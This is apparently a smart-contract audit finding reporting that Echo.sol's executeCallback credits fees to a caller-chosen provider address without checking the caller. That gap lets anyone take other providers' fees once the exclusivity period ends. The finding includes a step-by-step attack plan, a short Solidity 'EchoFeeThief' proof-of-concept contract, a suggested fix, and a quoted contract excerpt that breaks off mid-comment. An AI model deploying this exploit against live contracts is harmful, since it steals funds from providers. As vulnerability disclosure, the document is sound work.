### Title
Lack of Access Control on `providerToCredit` Parameter Allows Fee Theft in `executeCallback` — (`target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`Echo.executeCallback` accepts a caller-supplied `providerToCredit` address and credits the entire request fee to that address. After the exclusivity period expires, there is no check that `msg.sender == providerToCredit`. Any unprivileged attacker who registers as a provider can call `executeCallback` with their own address as `providerToCredit`, stealing the fee that was meant for the originally assigned provider.

---

### Finding Description

`Echo.executeCallback` is defined as:

```solidity
function executeCallback(
    address providerToCredit,
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
    Request storage req = findActiveRequest(sequenceNumber);

    if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
        require(
            providerToCredit == req.provider,
            "Only assigned provider during exclusivity period"
        );
    }
    // ...
    _state.providers[providerToCredit].accruedFeesInWei += SafeCast
        .toUint128((req.fee + msg.value) - pythFee);
``` [1](#0-0) [2](#0-1) 

During the exclusivity window the guard only checks `providerToCredit == req.provider`; it never checks `msg.sender == providerToCredit`. After the exclusivity period (default 15 seconds), even that guard is absent. Provider registration is permissionless:

```solidity
function registerProvider(...) external override {
    ProviderInfo storage provider = _state.providers[msg.sender];
    require(!provider.isRegistered, "Provider already registered");
    ...
}
``` [3](#0-2) 

Valid `updateData` is publicly available from Hermes at any time, so there is no practical barrier to constructing a valid call.

---

### Impact Explanation

An attacker can:
1. Call `registerProvider` with any fee values (permissionless).
2. Wait 15 seconds (the default `exclusivityPeriodSeconds`) after a request's `publishTime`.
3. Fetch valid price update data from the public Hermes API.
4. Call `executeCallback(attacker_address, sequenceNumber, updateData, priceIds)`.
5. The entire `req.fee` (the user's payment minus the Pyth protocol cut) is credited to the attacker's provider account.
6. Attacker calls `withdrawAsFeeManager` or registers themselves as their own fee manager and withdraws.

The original assigned provider receives nothing for the request they were supposed to fulfill. Repeated across all pending requests after each exclusivity window, an attacker can drain all provider-destined fees from the contract. [4](#0-3) [5](#0-4) 

---

### Likelihood Explanation

- **No privileged access required**: `registerProvider` is open to anyone.
- **No secret data required**: Hermes price update data is publicly served.
- **Minimal cost**: Only gas + the 15-second wait.
- **Scalable**: The attacker can target every pending request in a single block sweep after each exclusivity window expires.

---

### Recommendation

Add a check that the caller is the address being credited:

```solidity
require(
    msg.sender == providerToCredit,
    "Caller must be the provider to credit"
);
```

This mirrors the pattern already used in `withdrawAsFeeManager` and `setProviderFee`, where `msg.sender` is validated against the provider address before any state change that benefits that address. [6](#0-5) 

---

### Proof of Concept

```solidity
// Attacker contract
contract EchoFeeThief {
    IEcho echo;
    constructor(address _echo) { echo = IEcho(_echo); }

    function steal(
        uint64 sequenceNumber,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external {
        // 1. Register as provider (permissionless, one-time setup)
        echo.registerProvider(0, 0, 0);

        // 2. Call after exclusivity period (15s after publishTime)
        //    providerToCredit = address(this) — attacker's own provider account
        echo.executeCallback(address(this), sequenceNumber, updateData, priceIds);

        // 3. Withdraw accrued fees
        // (set self as fee manager and withdraw, or call withdraw() directly)
    }
}
```

After step 2, `_state.providers[address(this)].accruedFeesInWei` is incremented by the full `req.fee`, and the originally assigned provider receives nothing. [7](#0-6) [8](#0-7)

    function executeCallback(
        address providerToCredit,
        uint64 sequenceNumber,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external payable override {
        Request storage req = findActiveRequest(sequenceNumber);

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }

        // Verify priceIds match
        require(
            priceIds.length == req.priceIdPrefixes.length,
            "Price IDs length mismatch"
        );
        for (uint8 i = 0; i < req.priceIdPrefixes.length; i++) {
            // Extract first 8 bytes of the provided price ID
            bytes32 priceId = priceIds[i];
            bytes8 prefix;
            assembly {
                prefix := priceId
            }

            // Compare with stored prefix
            if (prefix != req.priceIdPrefixes[i]) {
                // Now we can directly use the bytes8 prefix in the error
                revert InvalidPriceIds(priceIds[i], req.priceIdPrefixes[i]);
            }
        }

        // TODO: should this use parsePriceFeedUpdatesUnique? also, do we need to add 1 to maxPublishTime?
        IPyth pyth = IPyth(_state.pyth);
        uint256 pythFee = pyth.getUpdateFee(updateData);
        PythStructs.PriceFeed[] memory priceFeeds = pyth.parsePriceFeedUpdates{
            value: pythFee
        }(
            updateData,
            priceIds,
            SafeCast.toUint64(req.publishTime),
            SafeCast.toUint64(req.publishTime)
        );

        // TODO: if this effect occurs here, we need to guarantee that executeCallback can never revert.
        // If executeCallback can revert, then funds can be permanently locked in the contract.
        // TODO: there also needs to be some penalty mechanism in case the expected provider doesn't execute the callback.
        // This should take funds from the expected provider and give to providerToCredit. The penalty should probably scale
